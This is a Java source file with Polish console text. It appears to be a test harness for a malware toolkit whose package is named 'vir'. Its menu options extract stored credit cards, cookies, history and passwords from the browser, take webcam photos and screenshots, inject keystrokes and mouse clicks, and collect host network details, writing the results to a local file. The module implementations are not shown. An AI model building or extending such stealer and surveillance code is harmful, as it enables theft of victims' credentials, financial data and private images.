package ru.xyz.test;

import ru.xyz.vir.browser.Browser;
import ru.xyz.vir.browser.Browser1;
import ru.xyz.vir.camera.CameraCapture;
import ru.xyz.vir.device.keyboard.KeyboardAction;
import ru.xyz.vir.device.mouse.MouseClicker;
import ru.xyz.vir.host.NetworkCapture;
import ru.xyz.vir.screen.ScreenCapture;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Scanner;

public class Testy {
    public static void main(String[] args) {
        while (true) {
            Scanner scanner = new Scanner(System.in);
            System.out.println("Wybierz opcję: browser, kamera, keyboard, mouse, file, host, screen");
            String option = scanner.nextLine();

            try (FileWriter writer = new FileWriter("output.txt")) {
                switch (option) {
                    case "browser":
                        System.out.println("[...] Testowanie przeglądarki");
                        Browser browser = new Browser();
                        writer.write("Przeglądarka testowana\n");
                        writer.write("Karty: " + browser.getCreditCards() + "\n");
                        writer.write("Ciasteczka: " + browser.getCookies() + "\n");
                        writer.write("Historia: " + browser.getHistory() + "\n");
                        writer.write("Hasła: " + browser.getPassowrds() + "\n");
                        writer.write("==========================================\n Success\n==========================================\n");
                        System.out.println("[/] Testowanie przeglądarki zakończone");
                        break;
                    case "kamera":
                        BufferedImage image = CameraCapture.captureImage();
                        File outputfile = new File("captured_image.png");
                        ImageIO.write(image, "png", outputfile);
                        System.out.println("[...] Testowanie aparatu");
                        writer.write("Kamera testowana\n");
                        writer.write("Obraz zapisany jako captured_image.png\n");
                        writer.write("==========================================\n Success\n==========================================\n");
                        System.out.println("[/] Testowanie aparatu zakończone");
                        break;
                    case "keyboard":
                        System.out.println("[...] Testowanie klawaiatury");
                        writer.write("Klawiatura testowana\n");
                        KeyboardAction.press("A", "B", "SHIFT", "C");
                        writer.write("==========================================\n Success\n==========================================\n");
                        System.out.println("[/] Testowanie klawiatury zakończone");
                        break;
                    case "mouse":
                        System.out.println("[...] Testowanie myszy");
                        MouseClicker.moveMouse(100, 100);
                        MouseClicker.leftClick();
                        MouseClicker.rightClick();
                        writer.write("Mysz testowana\n");
                        writer.write("==========================================\n Success\n==========================================\n");
                        System.out.println("[/] Testowanie myszy zakończone");
                        break;
                    case "host":
                        System.out.println("[...] Testowanie hosta");
                        System.out.println(NetworkCapture.getHostname());
                        System.out.println(NetworkCapture.getNetworkInterfaces());
                        System.out.println(NetworkCapture.getLocalIP());
                        writer.write("Host testowany\n");
                        writer.write("==========================================\n Success\n==========================================\n");
                        break;
                    case "screen":
                        System.out.println("[...] Testowanie screenshota");
                        writer.write("Ekran testowany\n");
                        BufferedImage bufferedImage = ScreenCapture.captureImage();
                        File out = new File("screen.png");
                        ImageIO.write(bufferedImage, "png", out);

                        System.out.println("Obraz zapisany jako screen.png");
                        writer.write("Obraz zapisany jako screen.png\n");
                        writer.write("==========================================\n Success\n==========================================\n");
                        System.out.println("[/] Testowanie screenshota zakończone");
                        break;
                    default:
                        writer.write("Nieznana opcja\n");
                        writer.write("Failure\n");
                        break;
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}